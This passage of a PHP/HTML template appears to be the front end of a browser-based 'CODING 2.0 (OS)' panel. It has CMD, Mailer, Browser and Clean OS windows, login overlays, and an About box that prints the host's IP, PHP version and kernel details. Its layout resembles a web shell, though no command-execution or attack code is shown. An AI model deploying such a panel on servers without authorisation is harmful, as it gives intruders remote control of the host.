            <button class="cmdhelp-close" title="Close" aria-label="Close"><span class="material-symbols-rounded">cancel</span></button>
        </div>
        <div class="cmdhelp-body" id="cmdhelp-body"></div>
    </div>
    <div id="cmdhelp-layer"></div>
    <!-- Layer to hold Errors windows -->
    <div id="errors-layer"></div>
    <!-- APPTools 1.0 popup template -->
    <div class="apptools-window" id="apptools-template" role="dialog" aria-label="APPTools 1.0" style="display:none;">
        <div class="apptools-titlebar">
            <div class="apptools-title">APPTools 1.0</div>
            <button class="apptools-close" title="Close" aria-label="Close"><span class="material-symbols-rounded">cancel</span></button>
        </div>
        <div class="apptools-body">
            <div class="apptools-card" data-app="errors" title="Open Errors" aria-label="Open Errors"><span class="material-symbols-rounded errors-icon">warning</span><span class="label">Errors</span></div>
            <div class="apptools-card" data-app="clean" title="Open Clean OS" aria-label="Open Clean OS"><span class="material-symbols-rounded">cleaning_bucket</span><span class="label">Clean OS</span></div>
            <div class="apptools-card" data-app="notes" title="Open Notes" aria-label="Open Notes"><span class="material-symbols-rounded">edit_note</span><span class="label">Notes</span></div>
            <div class="apptools-card" data-app="mailer" title="Open Mailer" aria-label="Open Mailer"><span class="material-symbols-rounded">mail</span><span class="label">Mailer</span></div>
            <div class="apptools-card" data-app="browser" title="Open Browser" aria-label="Open Browser"><span class="material-symbols-rounded">public</span><span class="label">Browser</span></div>
            <div class="apptools-card" data-app="wallpaper" title="Open Wallpaper" aria-label="Open Wallpaper"><span class="material-symbols-rounded">wallpaper</span><span class="label">Wallpaper</span></div>
            <div class="apptools-card" data-app="cmd" title="Open CMD" aria-label="Open CMD"><span class="material-symbols-rounded">terminal</span><span class="label">CMD</span></div>
            <div class="apptools-card" data-app="trash" title="Open Trash" aria-label="Open Trash"><span class="material-symbols-rounded">delete</span><span class="label">Trash</span></div>
            <div class="apptools-card" data-app="settings" title="Open Settings" aria-label="Open Settings"><span class="material-symbols-rounded">settings</span><span class="label">Settings</span></div>
            <div class="apptools-card" data-app="about" title="Open About" aria-label="Open About"><span class="material-symbols-rounded">account_circle</span><span class="label">About</span></div>
        </div>
    </div>
    <!-- Layer to hold APPTools windows -->
    <div id="apptools-layer"></div>
    <!-- Welcome Overlay -->
    <div id="welcome-overlay"><div class="welcome-box"><svg class="logo-spinner" viewBox="0 0 24 24" role="img" aria-label="Welcome logo"><circle class="base" cx="12" cy="12" r="9" stroke="Chartreuse" stroke-width="3" fill="none" /><path class="c-arc" d="M6 12a6 6 0 1 1 12 0" stroke="#e6eef7" stroke-width="3" fill="none" stroke-linecap="round" /><circle class="dot" cx="12" cy="12" r="2" /><circle class="spin" cx="12" cy="12" r="9" stroke="Chartreuse" stroke-width="3" fill="none" stroke-linecap="round" stroke-dasharray="56" stroke-dashoffset="42" /></svg><div class="welcome-text">welcome</div></div></div>
    <!-- App Loading Overlay -->
    <div id="app-loading">
        <div class="loading-box" aria-live="polite" aria-label="Loading">
            <!-- Original CODING 2.0 spinner logo -->
            <svg class="logo-spinner" viewBox="0 0 24 24" role="img" aria-label="Loading logo">
                <circle class="base" cx="12" cy="12" r="9" stroke="Chartreuse" stroke-width="3" fill="none" />
                <path class="c-arc" d="M6 12a6 6 0 1 1 12 0" stroke="#e6eef7" stroke-width="3" fill="none" stroke-linecap="round" />
                <circle class="dot" cx="12" cy="12" r="2" />
                <circle class="spin" cx="12" cy="12" r="9" stroke="Chartreuse" stroke-width="3" fill="none" stroke-linecap="round" stroke-dasharray="56" stroke-dashoffset="42" />
            </svg>
        </div>
    </div>
    <script>
    (function(){
        var welcome = document.getElementById('welcome-overlay');
        var qsForce = false;
        try { var qs = new URLSearchParams(window.location.search||''); qsForce = (qs.get('welcome') === '1'); } catch(_){ }
        var once = true;
        try { once = (localStorage.getItem('welcome.once') !== '1'); } catch(_){ }
        var shouldShow = qsForce || once;
        if (shouldShow && welcome) {
            window.__welcomeActive = true;
            welcome.classList.add('show');
            setTimeout(function(){
                welcome.classList.remove('show');
                welcome.style.display = 'none';
                window.__welcomeActive = false;
                try { localStorage.setItem('welcome.once','1'); } catch(_){}
                try { if (window.__appLoading && typeof window.__appLoading.show === 'function') window.__appLoading.show(); } catch(_){}
            }, 1200);
        } else {
            window.__welcomeActive = false;
            try { if (window.__appLoading && typeof window.__appLoading.show === 'function') window.__appLoading.show(); } catch(_){}
        }
    })();
    (function(){
        var overlay = document.getElementById('app-loading');
        function show(){ if(!overlay) return; overlay.style.display = 'flex'; overlay.classList.remove('hide'); }
        function hide(){ if(!overlay) return; overlay.classList.add('hide'); setTimeout(function(){ if(overlay) overlay.style.display = 'none'; }, 280); }
        window.__appLoading = { show: show, hide: hide };
        var startTime = Date.now();
        var minVisibleMs = 700;
        window.addEventListener('load', function(){
            var elapsed = Date.now() - startTime;
            var remaining = Math.max(0, minVisibleMs - elapsed);
            setTimeout(hide, remaining);
        });
        if (!window.__welcomeActive) { show(); }
    })();
    </script>
    <!-- CMD Notification popup template -->
    <div class="cmd-notify-window" id="cmd-notify-template" role="dialog" aria-label="--zsh" style="display:none;">
        <div class="cmd-titlebar">
            <div class="cmd-title">--zsh</div>
            <button class="cmd-close" title="Close" aria-label="Close"><span class="material-symbols-rounded">cancel</span></button>
        </div>
        <div class="cmd-notify-body">
            <div class="cmd-output cmd-notify-output" aria-live="polite"></div>
        </div>
    </div>
    <!-- Layer to hold CMD notifications -->
    <div id="cmd-notify-layer"></div>
    <!-- About popup overlay -->
    <div id="about-overlay" role="dialog" aria-modal="true" aria-label="About">
        <div class="about-modal" role="document">
            <div class="about-header">
                <div class="about-title"><span class="material-symbols-rounded" aria-hidden="true">account_circle</span> About CODING 2.0 (OS)</div>
                <button class="about-close" id="about-close-btn" title="Close" aria-label="Close"><span class="material-symbols-rounded">cancel</span></button>
            </div>
            <div class="about-body">
                <div class="about-logo">
                    <h2 class="logo-title" aria-label="CODING (OS)">
                        <span class="logo-text">C</span>
                        <span class="logo-o" aria-hidden="true">
                            <svg class="logo-spinner" viewBox="0 0 24 24" role="img" aria-label="O loading">
                                <circle class="base" cx="12" cy="12" r="9" stroke="Chartreuse" stroke-width="3" fill="none" />
                                <circle class="spin" cx="12" cy="12" r="9" stroke="Chartreuse" stroke-width="3" fill="none" stroke-linecap="round" stroke-dasharray="56" stroke-dashoffset="42" />
                                <circle class="dot" cx="12" cy="12" r="2" />
                            </svg>
                        </span>
                        <span class="logo-text">ODING (OS)</span>
                    </h2>
                </div>
                <p class="about-desc">CODING 2.0 (OS) Operating System</p>
                <div class="about-meta">
                    <div class="item copyright"><span class="material-symbols-rounded">copyright</span> <span>Copyright  Mister klio 2026</span></div>
                    <div class="item system"><span class="material-symbols-rounded">workspace_premium</span> <span>System name: CODING 2.0 (OS) 1.0</span></div>
                    <div class="item latest"><span class="material-symbols-rounded">verified</span> <span>Latest version: 1.0</span></div>
                </div>
                <div class="about-info" style="text-align:center; color:#cfd6df; margin-top:8px;">
                    <span class="material-symbols-rounded" aria-hidden="true">code</span> PHP version: <?= h(PHP_VERSION) ?>
                    <br>
                    <span class="material-symbols-rounded" aria-hidden="true">router</span> IP system: <?= h($_SERVER['SERVER_ADDR'] ?? ($_SERVER['REMOTE_ADDR'] ?? 'unknown')) ?>
                    <br>
                    <span class="material-symbols-rounded" aria-hidden="true">memory</span> Software System: <?= h($_SERVER['SERVER_SOFTWARE'] ?? 'Unknown') ?>
                    <br>
                    <span class="material-symbols-rounded" aria-hidden="true">dns</span> Server System: <?= h(php_uname('s') . ' ' . php_uname('r')) ?>
                    <br>
                    <span class="material-symbols-rounded" aria-hidden="true">link</span> Github: <a href="https://www.github.com/Misterklio" target="_blank" rel="noopener" style="color: Chartreuse; text-decoration:none;">www.github.com/Misterklio</a>
                    <br>
                    <span class="material-symbols-rounded" aria-hidden="true">send</span> Telegram: <a href="https://t.me/Misterklio" target="_blank" rel="noopener" style="color: Chartreuse; text-decoration:none;">@Misterklio</a>
                    <br>
                    <span class="material-symbols-rounded" aria-hidden="true">public</span> Website: <a href="https://www.oscoding.vip" target="_blank" rel="noopener" style="color: Chartreuse; text-decoration:none;">www.oscoding.vip</a>
                </div>
                <div class="about-end-logo" style="display:flex; justify-content:center; margin-top:12px;">
                    <svg class="logo-spinner" viewBox="0 0 24 24" role="img" aria-label="Loading logo">
                        <circle class="base" cx="12" cy="12" r="9" stroke="Chartreuse" stroke-width="3" fill="none" />
                        <circle class="spin" cx="12" cy="12" r="9" stroke="Chartreuse" stroke-width="3" fill="none" stroke-linecap="round" stroke-dasharray="56" stroke-dashoffset="42" />
                        <circle class="dot" cx="12" cy="12" r="2" />
                    </svg>
                </div>
            </div>
        </div>
    </div>
    <!-- Centered dock icon to restore layout when minimized -->
    <div id="terminal-dock" role="dialog" aria-label="App Dock" style="display:none;">
        <button class="dock-terminal app-icon" id="dock-terminal-btn" type="button" title="APP 2.0" aria-label="APP 2.0" data-label="APP 2.0">
            <span class="dock-logo" aria-hidden="true">
                <svg class="logo-spinner" viewBox="0 0 24 24" role="img" aria-label="Loading logo">
                    <circle class="base" cx="12" cy="12" r="9" stroke="Chartreuse" stroke-width="3" fill="none" />
                    <circle class="spin" cx="12" cy="12" r="9" stroke="Chartreuse" stroke-width="3" fill="none" stroke-linecap="round" stroke-dasharray="56" stroke-dashoffset="42" />
                    <circle class="dot" cx="12" cy="12" r="2" />
                </svg>
            </span>
        </button>
    </div>
    <!-- Draggable Browser dock icon while minimized -->
    <div id="browser-dock" role="dialog" aria-label="Browser Dock" style="display:none;">
        <button class="dock-browser app-icon" id="dock-browser-btn" type="button" title="Browser" aria-label="Open Browser" data-label="Browser">
            <span class="dock-logo" aria-hidden="true">
                <!-- Use alternate Browser OS icon for distinct identity -->
                <svg class="browser-os-icon-2" viewBox="0 0 24 24" role="img" aria-label="Browser OS icon alt">
                    <circle class="ring" cx="12" cy="12" r="9" stroke-width="3" fill="none" />
                    <path class="c-arc" d="M6 12a6 6 0 1 1 12 0" stroke-width="3" fill="none" stroke-linecap="round" />
                    <circle class="dot" cx="12" cy="12" r="2" />
                    <circle class="scan" cx="12" cy="12" r="9" stroke-width="3" fill="none" stroke-linecap="round" stroke-dasharray="56" stroke-dashoffset="42" />
                </svg>
            </span>
        </button>
    </div>
    <!-- Draggable Notes dock icon while minimized -->
    <div id="notes-dock" role="dialog" aria-label="Notes Dock" style="display:none;">
        <button class="dock-notes app-icon" id="dock-notes-btn" type="button" title="Notes" aria-label="Open Notes" data-label="Notes">
            <svg class="notes-icon" xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="28" height="28" viewBox="0,0,256,256" aria-hidden="true">
                <defs>
                    <linearGradient x1="28.529" y1="15.472" x2="33.6" y2="10.4" gradientUnits="userSpaceOnUse" id="notes_dock_gr1">
                        <stop offset="0" stop-color="#3079d6"></stop>
                        <stop offset="1" stop-color="#297cd2"></stop>
                    </linearGradient>
                    <linearGradient x1="39.112" y1="21.312" x2="39.112" y2="26.801" gradientUnits="userSpaceOnUse" id="notes_dock_gr2">
                        <stop offset="0" stop-color="#dedede"></stop>
                        <stop offset="1" stop-color="#d6d6d6"></stop>
                    </linearGradient>
                </defs>
                <g fill="none" fill-rule="nonzero" stroke="none" stroke-width="1" stroke-linecap="butt" stroke-linejoin="miter" stroke-miterlimit="10" stroke-dasharray="" stroke-dashoffset="0" font-family="none" font-weight="none" font-size="none" text-anchor="none" style="mix-blend-mode: normal">
                    <g transform="scale(5.33333,5.33333)">
                        <path d="M39,16v25c0,1.105 -0.895,2 -2,2h-26c-1.105,0 -2,-0.895 -2,-2v-34c0,-1.105 0.895,-2 2,-2h17z" fill="#edb90b"></path>
                        <path d="M32.5,21h-17c-0.276,0 -0.5,-0.224 -0.5,-0.5v-1c0,-0.276 0.224,-0.5 0.5,-0.5h17c0.276,0 0.5,0.224 0.5,0.5v1c0,0.276 -0.224,0.5 -0.5,0.5z" fill="#057093"></path>
                        <path d="M30.5,25h-15c-0.276,0 -0.5,-0.224 -0.5,-0.5v-1c0,-0.276 0.224,-0.5 0.5,-0.5h15c0.276,0 0.5,0.224 0.5,0.5v1c0,0.276 -0.224,0.5 -0.5,0.5z" fill="#057093"></path>
                        <path d="M32.5,29h-17c-0.276,0 -0.5,-0.224 -0.5,-0.5v-1c0,-0.276 0.224,-0.5 0.5,-0.5h17c0.276,0 0.5,0.224 0.5,0.5v1c0,0.276 -0.224,0.5 -0.5,0.5z" fill="#057093"></path>
                        <path d="M30.5,33h-15c-0.276,0 -0.5,-0.224 -0.5,-0.5v-1c0,-0.276 0.224,-0.5 0.5,-0.5h15c0.276,0 0.5,0.224 0.5,0.5v1c0,0.276 -0.224,0.5 -0.5,0.5z" fill="#057093"></path>
                        <path d="M28,5v9c0,1.105 0.895,2 2,2h9z" fill="url(#notes_dock_gr1)"></path>
                        <path d="M39,19.602l-15.899,15.902l-1.233,4.896c-0.111,0.442 0.29,0.843 0.732,0.732l4.897,-1.233l11.503,-11.505z" fill="#000000" opacity="0.05"></path>
                        <path d="M39,20.309l-15.059,15.062l-0.547,1.017v0h-0.001l-0.864,3.434c-0.099,0.392 0.256,0.746 0.648,0.648l3.446,-0.868v0v0l1.006,-0.543l11.371,-11.396z" fill="#000000" opacity="0.07"></path>
                        <path d="M42.781,22.141l-1.922,-1.921c-0.292,-0.293 -0.768,-0.293 -1.061,0l-0.904,0.905l2.981,2.981l0.905,-0.904c0.293,-0.294 0.293,-0.768 0.001,-1.061" fill="#c94f60"></path>
                        <path d="M24.003,36.016l-1.003,3.984l3.985,-1.003l0.418,-3.456z" fill="#f0f0f0"></path>
                        <path d="M39.333,26.648l-12.348,12.348l-2.981,-2.981l12.348,-12.348z" fill="#edbe00"></path>
                        <path d="M36.349,23.667l2.543,-2.544l2.983,2.981l-2.543,2.544z" fill="url(#notes_dock_gr2)"></path>
                        <path d="M23.508,37.985l-0.508,2.015l2.014,-0.508z" fill="#787878"></path>
                    </g>
                </g>
            </svg>
            </svg>
        </button>
    </div>
    <!-- Draggable Mailer dock icon while minimized -->
    <div id="mailer-dock" role="dialog" aria-label="Mailer Dock" style="display:none;">
        <button class="dock-mailer app-icon" id="dock-mailer-btn" type="button" title="Mailer" aria-label="Open Mailer" data-label="Mailer">
            <svg class="mailer-icon-svg" xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="28" height="28" viewBox="0 0 256 256" aria-hidden="true">
                <defs>
                    <linearGradient x1="18.921" y1="5.715" x2="25.143" y2="26.715" gradientUnits="userSpaceOnUse" id="color-1_OumT4lIcOllS_gr1"><stop offset="0" stop-color="#40d300"></stop><stop offset="1" stop-color="#36a108"></stop></linearGradient>
                    <linearGradient x1="24" y1="15.394" x2="24" y2="28.484" gradientUnits="userSpaceOnUse" id="color-2_OumT4lIcOllS_gr2"><stop offset="0" stop-color="#ffffff"></stop><stop offset="0.24" stop-color="#f8f8f7"></stop><stop offset="1" stop-color="#e3e3e1"></stop></linearGradient>
                    <linearGradient x1="25.886" y1="27.936" x2="37.997" y2="45.269" gradientUnits="userSpaceOnUse" id="color-3_OumT4lIcOllS_gr3"><stop offset="0" stop-color="#3cf44c"></stop><stop offset="1" stop-color="#32e51f"></stop></linearGradient>
                    <linearGradient x1="3.074" y1="27.236" x2="39.962" y2="45.125" gradientUnits="userSpaceOnUse" id="color-4_OumT4lIcOllS_gr4"><stop offset="0" stop-color="#57ea28"></stop><stop offset="1" stop-color="#0bda42"></stop></linearGradient>
                </defs>
                <g fill="none" fill-rule="nonzero" stroke="none" stroke-width="1" stroke-linecap="butt" stroke-linejoin="miter" stroke-miterlimit="10" stroke-dasharray="" stroke-dashoffset="0" font-family="none" font-weight="none" font-size="none" text-anchor="none" style="mix-blend-mode: normal">
                    <g transform="scale(5.33333,5.33333)">
                        <path d="M43,29.452h-38v-12.898c0,-0.686 0.352,-1.325 0.932,-1.691l16.466,-10.4c0.979,-0.618 2.225,-0.618 3.204,0l16.466,10.4c0.58,0.367 0.932,1.005 0.932,1.691z" fill="url(#color-1_OumT4lIcOllS_gr1)"></path>
                        <path d="M39,33h-30v-17c0,-0.552 0.448,-1 1,-1h28c0.552,0 1,0.448 1,1z" fill="url(#color-2_OumT4lIcOllS_gr2)"></path>
                        <path d="M43,17v21.256c0,0.963 -0.794,1.744 -1.774,1.744h-31.666l4.803,-6.327z" fill="url(#color-3_OumT4lIcOllS_gr3)"></path>
                        <path d="M5,17v21.256c0,0.963 0.794,1.744 1.774,1.744h34.453c0.56,0 1.053,-0.26 1.378,-0.658z" fill="url(#color-4_OumT4lIcOllS_gr4)"></path>
                    </g>
                </g>
            </svg>
        </button>
    </div>
    <!-- Draggable CMD dock icon while minimized -->
    <div id="cmd-dock" role="dialog" aria-label="CMD Dock" style="display:none;">
        <button class="dock-cmd app-icon" id="dock-cmd-btn" type="button" title="CMD" aria-label="Open CMD" data-label="CMD">
            <svg xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="28" height="28" viewBox="0 0 48 48" aria-hidden="true">
                <rect width="14" height="7" x="17" y="8" fill="#999"></rect>
                <path fill="#666" d="M43,8H31v7h14v-5C45,8.895,44.105,8,43,8z"></path>
                <path fill="#ccc" d="M5,8c-1.105,0-2,0.895-2,2v5h14V8H5z"></path>
                <linearGradient id="u8UbA7GmcDgkSbOtELVhra_WbRVMGxHh74X_gr1" x1="3.594" x2="44.679" y1="13.129" y2="39.145" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#4c4c4c"></stop><stop offset="1" stop-color="#343434"></stop></linearGradient>
                <path fill="url(#u8UbA7GmcDgkSbOtELVhra_WbRVMGxHh74X_gr1)" d="M45,13H3v25c0,1.105,0.895,2,2,2h38c1.105,0,2-0.895,2-2V13z"></path>
                <path d="M10.597,18.314l-2.319,2.319c-0.514,0.514-0.514,1.347,0,1.861l3.978,3.978l-4.033,4.033	c-0.514,0.514-0.514,1.347,0,1.861l2.319,2.319c0.514,0.514,1.347,0.514,1.861,0l7.282-7.283c0.514-0.514,0.514-1.347,0-1.861	l-7.228-7.228C11.944,17.8,11.111,17.8,10.597,18.314z" opacity=".05"></path>
                <path d="M10.889,18.729l-2.197,2.197c-0.352,0.352-0.352,0.924,0,1.276l4.271,4.271l-4.325,4.325	c-0.352,0.352-0.352,0.924,0,1.276l2.197,2.197c0.353,0.352,0.924,0.352,1.276,0l7.16-7.161c0.352-0.352,0.352-0.924,0-1.276	l-7.106-7.106C11.813,18.376,11.242,18.376,10.889,18.729z" opacity=".07"></path>
                <linearGradient id="u8UbA7GmcDgkSbOtELVhrb_WbRVMGxHh74X_gr2" x1="10.135" x2="15.002" y1="32.774" y2="27.907" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#a0a0a0"></stop><stop offset=".569" stop-color="#9e9e9e"></stop><stop offset=".774" stop-color="#979797"></stop><stop offset=".92" stop-color="#8c8c8c"></stop><stop offset="1" stop-color="#818181"></stop></linearGradient>
                <path fill="url(#u8UbA7GmcDgkSbOtELVhrb_WbRVMGxHh74X_gr2)" d="M9.053,31.09l6.983-6.983c0.191-0.191,0.501-0.191,0.692,0l2.075,2.075	c0.191,0.191,0.191,0.501,0,0.692l-6.983,6.983c-0.191,0.191-0.501,0.191-0.692,0l-2.075-2.075	C8.862,31.591,8.862,31.281,9.053,31.09z"></path>
                <path fill="#d0d0d0" d="M11.873,19.143l6.983,6.983c0.191,0.191,0.191,0.501,0,0.692l-2.075,2.075	c-0.191,0.191-0.501,0.191-0.692,0L9.107,21.91c-0.191-0.191-0.191-0.501,0-0.692l2.075-2.075	C11.373,18.952,11.682,18.952,11.873,19.143z"></path>
                <path d="M22,32v4c0,0.552,0.448,1,1,1h17c0.552,0,1-0.448,1-1v-4c0-0.552-0.448-1-1-1H23	C22.448,31,22,31.448,22,32z" opacity=".05"></path>
                <path d="M39.909,36.5H23.091c-0.326,0-0.591-0.265-0.591-0.591v-3.818c0-0.326,0.265-0.591,0.591-0.591	c0.326,0,0.591,0.265,0.591,0.591v3.818C40.5,36.235,40.235,36.5,39.909,36.5z" opacity=".07"></path>
                <path fill="#d4d4d4" d="M23.5,32h16c0.276,0,0.5,0.224,0.5,0.5v3c0,0.276-0.224,0.5-0.5,0.5h-16c-0.276,0-0.5-0.224-0.5-0.5	v-3C23,32.224,23.224,32,23.5,32z"></path>
            </svg>
        </button>
    </div>
    <!-- Draggable Settings dock icon while minimized -->
    <div id="settings-dock" role="dialog" aria-label="Settings Dock" style="display:none;">
        <button class="dock-settings app-icon" id="dock-settings-btn" type="button" title="Settings" aria-label="Open Settings" data-label="Settings">
            <svg xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="28" height="28" viewBox="0 0 48 48" aria-hidden="true">
                <linearGradient id="S-3uZWb86E5mIfWsom8tFa_EHYRINeSAUFT_gr1" x1="-5.186" x2="71.747" y1="52.653" y2="-22.875" gradientUnits="userSpaceOnUse">
                    <stop offset="0" stop-color="#faf3df"></stop>
                    <stop offset="1" stop-color="#5578b8"></stop>
                </linearGradient>
                <path fill="url(#S-3uZWb86E5mIfWsom8tFa_EHYRINeSAUFT_gr1)" d="M41.426,19.561c-0.43-1.691-1.094-3.284-1.965-4.746l1.67-4.268	c0.332-0.848,0.13-1.813-0.514-2.457l-1.768-1.768l-5.666,2.217c-1.462-0.87-3.054-1.535-4.745-1.965l-1.838-4.2	C26.236,1.539,25.411,1,24.5,1H22l-2.439,5.574c-1.691,0.43-3.284,1.094-4.746,1.965l-4.268-1.67	C9.699,6.537,8.734,6.739,8.09,7.383L6.322,9.151l2.217,5.666c-0.87,1.462-1.535,3.054-1.965,4.745l-4.2,1.838	C1.539,21.764,1,22.589,1,23.5V26l5.574,2.439c0.43,1.691,1.094,3.284,1.965,4.746l-1.67,4.268c-0.332,0.849-0.13,1.813,0.514,2.458	l1.768,1.768l5.666-2.217c1.462,0.87,3.054,1.535,4.745,1.965l1.838,4.2C21.764,46.461,22.589,47,23.5,47H26l2.439-5.574	c1.691-0.43,3.284-1.094,4.746-1.965l4.268,1.67c0.849,0.332,1.813,0.13,2.458-0.514l1.768-1.768l-2.217-5.666	c0.87-1.462,1.535-3.054,1.965-4.745l4.2-1.838C46.461,26.236,47,25.411,47,24.5V22L41.426,19.561z"></path>
                <linearGradient id="S-3uZWb86E5mIfWsom8tFb_EHYRINeSAUFT_gr2" x1="3.781" x2="30.502" y1="3.781" y2="30.502" gradientUnits="userSpaceOnUse">
                    <stop offset="0" stop-color="#faf3df"></stop>
                    <stop offset="1" stop-color="#344878"></stop>
                </linearGradient>
                <circle cx="24" cy="24" r="10" fill="url(#S-3uZWb86E5mIfWsom8tFb_EHYRINeSAUFT_gr2)"></circle>
            </svg>
        </button>
    </div>
    <!-- Draggable Wallpaper dock icon while minimized -->
    <div id="wallpaper-dock" role="dialog" aria-label="Wallpaper Dock" style="display:none;">
        <button class="dock-wallpaper app-icon" id="dock-wallpaper-btn" type="button" title="Wallpaper" aria-label="Open Wallpaper" data-label="Wallpaper">
            <span aria-hidden="true" class="wp-wrap">
                <span class="design">
                    <span class="circle-1 center color-border">
                        <span class="circle-2 center color-border">
                            <span class="circle-3 center color-border">
                                <span class="circle-4 center color-border">
                                    <span class="circle-5"></span>
                                </span>
                            </span>
                        </span>
                    </span>
                    <span class="mountain-1 shape shadow"></span>
                    <span class="mountain-2 shape"></span>
                    <span class="mountain-3 shape shadow"></span>
                </span>
            </span>
        </button>
    </div>
    <!-- Errors dock icon -->
    <div id="errors-dock" role="dialog" aria-label="Errors Dock" style="display:none;">
        <button class="dock-errors app-icon" id="dock-errors-btn" type="button" title="Errors" aria-label="Open Errors" data-label="Errors">
            <svg class="errors-icon" xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="28" height="28" viewBox="0,0,256,256" aria-hidden="true">
                <g fill="none" fill-rule="nonzero" stroke="none" stroke-width="1" stroke-linecap="butt" stroke-linejoin="miter" stroke-miterlimit="10" stroke-dasharray="" stroke-dashoffset="0" font-family="none" font-weight="none" font-size="none" text-anchor="none" style="mix-blend-mode: normal">
                    <g transform="scale(5.33333,5.33333)">
                        <path d="M24,44c-0.552,0 -1,-0.448 -1,-1c0,-0.552 0.448,-1 1,-1z" fill="#03c831"></path>
                        <path d="M25,43c0,0.552 -0.448,1 -1,1v-2c0.552,0 1,0.448 1,1z" fill="#0f946e"></path>
                        <circle cx="42" cy="11" r="1" fill="#08d926"></circle>
                        <circle cx="6" cy="11" r="1" fill="#67f033"></circle>
                        <path d="M24,43l0.427,0.907c0,0 15.144,-7.9 18.08,-19.907h-18.507z" fill="#0f946e"></path>
                        <path d="M43,11l-1,-1c-11.122,0 -11.278,-6 -18,-6v20h18.507c0.315,-1.288 0.493,-2.622 0.493,-4c0,-3.144 0,-9 0,-9z" fill="#08d926"></path>
                        <path d="M24,43l-0.427,0.907c0,0 -15.144,-7.9 -18.08,-19.907h18.507z" fill="#03c831"></path>
                        <path d="M5,11l1,-1c11.122,0 11.278,-6 18,-6v20h-18.507c-0.315,-1.288 -0.493,-2.622 -0.493,-4c0,-3.144 0,-9 0,-9z" fill="#67f033"></path>
                    </g>
                </g>
            </svg>
        </button>
    </div>
    <!-- APPTools dock icon -->
    <div id="apptools-dock" role="dialog" aria-label="APPTools Dock" style="display:none;">
        <button class="dock-apptools app-icon" id="dock-apptools-btn" type="button" title="APPTools 1.0" aria-label="Open APPTools 1.0" data-label="APPTools 1.0">
            <svg class="apptools-icon" xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="28" height="28" viewBox="0 0 256 256" role="img" aria-label="APPTools app store icon">
                <defs><linearGradient x1="17.08" y1="5" x2="17.08" y2="39.566" gradientUnits="userSpaceOnUse" id="apptools_dock_gr1"><stop offset="0" stop-color="#00d325"></stop><stop offset="1" stop-color="#0b59a4"></stop></linearGradient><linearGradient x1="30.92" y1="5" x2="30.92" y2="43" gradientUnits="userSpaceOnUse" id="apptools_dock_gr2"><stop offset="0" stop-color="#d3f135"></stop><stop offset="1" stop-color="#15e23f"></stop></linearGradient></defs><g fill="none" fill-rule="nonzero" stroke="none" stroke-width="1" stroke-linecap="butt" stroke-linejoin="miter" stroke-miterlimit="10" stroke-dasharray="" stroke-dashoffset="0" font-family="none" font-weight="none" font-size="none" text-anchor="none" style="mix-blend-mode: normal"><g transform="scale(5.33333,5.33333)"><path d="M17.28,24l3.723,4.595c0.593,0.732 0.595,1.779 0.004,2.513l-6.508,8.084c-0.4,0.497 -1.157,0.497 -1.558,0l-10.217,-12.683c-1.18,-1.465 -1.18,-3.553 0,-5.018l12.676,-15.741c0.38,-0.48 0.95,-0.75 1.56,-0.75h14.08c0.48,0 0.93,0.16 1.28,0.46z" fill="url(#apptools_dock_gr1)"></path><path d="M32.32,5.46l-8.96,11.05l-8.34,-10.28l0.38,-0.48c0.38,-0.48 0.95,-0.75 1.56,-0.75z" fill="#000000" opacity="0.05"></path><path d="M32.32,5.46l-8.64,10.65l-8.35,-10.28l0.07,-0.08c0.38,-0.48 0.95,-0.75 1.56,-0.75z" fill="#000000" opacity="0.07"></path><path d="M45.276,21.491c1.179,1.465 1.179,3.553 0,5.018l-12.676,15.741c-0.38,0.48 -0.95,0.75 -1.56,0.75h-14.264c-0.589,0 -0.915,-0.683 -0.544,-1.141l14.488,-17.859l-15.04,-18.54c0.35,-0.3 0.8,-0.46 0.8,-0.46h14.08c0.61,0 1.18,0.27 1.56,0.75z" fill="url(#apptools_dock_gr2)"></path></g></g>
            </svg>
        </button>
    </div>
    <!-- Clean OS dock icon -->
    <div id="clean-dock" role="dialog" aria-label="Clean Dock" style="display:none;">
        <button class="dock-clean app-icon" id="dock-clean-btn" type="button" title="Clean OS" aria-label="Open Clean OS" data-label="Clean OS">
            <svg class="clean-icon" viewBox="0 0 24 24" role="img" aria-label="Clean OS icon">
                <defs>
                    <linearGradient id="cleanGradDock" x1="0" y1="0" x2="1" y2="1">
                        <stop offset="0%" stop-color="Chartreuse"/>
                        <stop offset="100%" stop-color="Chartreuse"/>
                    </linearGradient>
                </defs>
                <g fill="none" stroke="url(#cleanGradDock)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                    <path class="broom-stick" d="M4 20 L18 6"/>
                    <path class="broom-head" d="M16 8 C15 10, 13 12, 11 13"/>
                    <path class="broom-bristle" d="M12 12 C11 13, 9 14, 7 15"/>
                    <circle class="sparkle s1" cx="8" cy="6" r="1"/>
                    <circle class="sparkle s2" cx="20" cy="12" r="1.2"/>
                    <circle class="sparkle s3" cx="12" cy="20" r="1"/>
                </g>
            </svg>
        </button>
    </div>
    <!-- Trash dock icon removed: Trash remains available via header only -->
    <!-- Login success terminal overlay (CMD-style) -->
    <div class="overlay-terminal" id="login-terminal-overlay" role="dialog" aria-modal="true" aria-label="Login Success">
        <div class="terminal-modal" role="document">
            <div class="titlebar">
                <div class="traffic">
                    <span class="dot red"></span>
                    <span class="dot yellow"></span>
                    <span class="dot green"></span>
                </div>
